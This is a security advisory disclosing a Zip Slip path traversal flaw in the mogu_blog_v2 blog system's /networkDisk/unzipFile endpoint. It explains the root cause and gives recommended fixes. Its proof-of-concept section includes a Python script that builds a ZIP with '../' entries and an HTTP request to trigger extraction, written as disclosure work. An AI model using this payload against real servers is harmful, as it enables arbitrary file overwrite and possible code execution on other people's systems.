# Zip Slip Path Traversal Leading to Arbitrary File Write in mogu_blog_v2

## Vulnerability Overview

**Submitter**: sh7err@vEcho

mogu_blog_v2 is a microservice-based front-end and back-end separated blog system. A critical Zip Slip vulnerability has been identified in the network disk file decompression functionality that allows authenticated attackers with network disk access to write arbitrary files to any location on the server filesystem, potentially leading to remote code execution.

## Affected Component

- **Project**: mogu_blog_v2
- **Vendor**: moxi159753
- **Affected Endpoint**: `/networkDisk/unzipFile`
- **Affected Files**:
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/restapi/NetworkDiskRestApi.java` (lines 121-157)
  - `mogu_utils/src/main/java/com/moxi/mogublog/utils/upload/FileOperation.java` (lines 209-259)

## Vulnerability Details

### Root Cause

The vulnerability exists in the `FileOperation.unzip()` method, which performs ZIP file extraction without proper path validation:

1. **Missing Path Traversal Validation**: At line 241 of `FileOperation.java`, the code directly constructs file paths using:
   ```java
   File targetFile = new File(destDirPath + "/" + entry.getName());
   ```

2. **No Canonicalization**: The `entry.getName()` value from the ZIP archive is used directly without:
   - Checking for `..` (parent directory references)
   - Validating against absolute paths
   - Ensuring the resolved path stays within the target directory
   - Normalizing or sanitizing the path

3. **Unrestricted File Creation**: The code creates parent directories and writes files without verifying the final path is within the intended extraction directory.

### Attack Vector

An attacker with network disk access can exploit this vulnerability by:

1. Creating a malicious ZIP file with specially crafted entry names containing path traversal sequences (e.g., `../../../../etc/cron.d/malicious`)
2. Uploading the malicious ZIP file to the network disk
3. Calling `/networkDisk/unzipFile` with the uploaded ZIP file's URL
4. The application extracts the ZIP file, and due to the lack of path validation, files are written to attacker-controlled locations outside the intended directory

This is a classic "Zip Slip" vulnerability (discovered by Snyk in 2018), affecting numerous applications worldwide.

## Proof of Concept

### Step 1: Create Malicious ZIP File

```python
import zipfile

# Create a malicious ZIP file with path traversal
with zipfile.ZipFile('malicious.zip', 'w') as zipf:
    # Add a file that will be written to /tmp/pwned.txt
    zipf.writestr('../../../../tmp/pwned.txt', 'Arbitrary file write successful!')

    # Add a file that could overwrite application configuration
    zipf.writestr('../../../../app/config/application.yml', 'malicious: config')
```

### Step 2: Upload ZIP to Network Disk

Upload `malicious.zip` through the network disk interface. The file will be stored at a path like:
`/blog/admin/zip/2024/06/03/1717390000000.zip`

### Step 3: Trigger Decompression

```http
POST /networkDisk/unzipFile HTTP/1.1
Host: target-server.com
Content-Type: application/json
Authorization: Bearer [authenticated-token]

{
  "fileUrl": "/blog/admin/zip/2024/06/03/1717390000000.zip",
  "filePath": "/"
}
```

### Result

The file `../../../../tmp/pwned.txt` will be written to `/tmp/pwned.txt` (or any other attacker-specified location), escaping the intended extraction directory.

## Impact

This vulnerability has **CRITICAL** severity and allows authenticated attackers to:

1. **Arbitrary File Write**: Write files to any location where the application process has write permissions
2. **Remote Code Execution**:
   - Overwrite executable scripts (e.g., startup scripts, cron jobs)
   - Modify application configuration files
   - Write to web-accessible directories for webshell deployment
   - Overwrite `.jar` files or class files
3. **Configuration Tampering**: Modify `application.yml`, `application.properties`, or other configuration files to change system behavior
4. **Privilege Escalation**: Write to sensitive system locations if the application runs with elevated privileges
5. **Data Destruction**: Overwrite critical application files or databases

The vulnerability requires authentication and network disk access, but for legitimate users with these permissions, it provides a direct path to complete system compromise.

## Affected Versions

All versions of mogu_blog_v2 in the current repository are affected. The vulnerability exists in both Eureka and Nacos branches.

## Recommendations

1. **Implement Path Validation**: Before writing any file, validate that the resolved canonical path is within the target directory:
   ```java
   File targetFile = new File(destDirPath + "/" + entry.getName());
   String canonicalPath = targetFile.getCanonicalPath();
   if (!canonicalPath.startsWith(new File(destDirPath).getCanonicalPath())) {
       throw new SecurityException("Zip Slip detected: " + entry.getName());
   }
   ```

2. **Reject Dangerous Paths**: Check for and reject ZIP entries containing:
   - `..` (parent directory references)
   - Absolute paths (starting with `/` or containing `:`)
   - Backslashes on Windows (`\`)

3. **Use Safe Extraction Libraries**: Consider using libraries that provide built-in Zip Slip protection

4. **Sandbox Extraction**: Extract ZIP files to a temporary isolated directory first, validate all contents, then move to the final location

5. **Limit Permissions**: Run the application with minimal filesystem permissions to reduce impact

6. **Content Scanning**: Scan extracted files for malicious content before making them accessible

7. **Add Logging**: Log all file extraction operations with entry names for security monitoring

## References

- Repository: https://gitee.com/moxi159753/mogu_blog_v2
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- Zip Slip Vulnerability: https://github.com/snyk/zip-slip-vulnerability
- Snyk Research: https://security.snyk.io/research/zip-slip-vulnerability
